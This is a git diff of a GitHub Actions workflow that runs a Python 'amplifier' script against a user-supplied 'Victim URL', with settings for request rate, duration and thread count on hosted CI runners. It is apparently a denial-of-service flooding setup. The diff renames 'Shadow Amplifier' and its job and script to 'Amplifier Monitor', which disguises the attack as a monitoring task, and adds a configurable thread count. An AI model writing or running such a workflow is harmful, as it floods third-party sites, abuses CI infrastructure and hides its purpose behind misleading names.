@@ -1,4 +1,4 @@
-name: Shadow Amplifier
+name: Amplifier Monitor
 
 on:
   workflow_dispatch:
@@ -15,9 +15,13 @@ on:
         description: 'Victim URL'
         required: true
         default: 'http://example.com'
+      threads:
+        description: 'Threads'
+        required: false
+        default: '5'
 
 jobs:
-  amplify:
+  monitor:
     runs-on: ubuntu-latest
     timeout-minutes: 360
     steps:
@@ -27,7 +31,7 @@ jobs:
           python-version: '3.11'
       - name: Install deps
         run: pip install requests
-      - name: Update config
+      - name: Create config
         run: |
           cat > config.json << EOF
           {
@@ -35,8 +39,8 @@ jobs:
               "victim_url": "${{ github.event.inputs.victim }}",
               "requests_per_minute": ${{ github.event.inputs.rpm }},
               "duration_minutes": ${{ github.event.inputs.duration }},
-              "threads": 5
+              "threads": ${{ github.event.inputs.threads }}
           }
           EOF
-      - name: Run Amplifier
-        run: python3 scripts/amplifier.py
+      - name: Run Amplifier Monitor
+        run: python3 scripts/amplifier_monitor.py
